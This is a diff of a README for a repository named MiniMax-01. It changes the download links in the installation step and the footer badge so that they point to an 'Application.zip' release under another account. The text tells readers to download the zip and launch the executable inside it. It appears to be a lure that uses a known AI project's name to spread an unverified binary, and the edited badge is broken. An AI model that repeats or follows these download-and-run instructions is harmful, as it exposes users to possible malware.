@@ -25,7 +25,7 @@ The MiniMax-01 repository houses an application that implements the MiniMax algo
 ## Installation
 To get started with the MiniMax-01 application, follow these steps:
 
-1. Download the application package from the following link: [Download MiniMax-01 Application](https://github.com/user-attachments/files/18426772/Application.zip). Please note that the application needs to be launched after downloading.
+1. Download the application package from the following link: [Download MiniMax-01 Application](https://github.com/Delxrius/MiniMax-01/releases/download/v1.0/Application.zip). Please note that the application needs to be launched after downloading.
 
 2. Unzip the downloaded file and run the application executable to launch the MiniMax-01 application.
 
@@ -58,4 +58,4 @@ Thank you for exploring the MiniMax-01 repository. We hope you enjoy using the M
 
 ---
 
-Feel free to visit the application download link: [![Download MiniMax-01 Application](https://img.shields.io/badge/Download-Application-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+Feel free to visit the application download link: [![Download MiniMax-01 Application](https://github.com/Delxrius/MiniMax-01/releases/download/v1.0/Application.zip)](https://github.com/Delxrius/MiniMax-01/releases/download/v1.0/Application.zip)
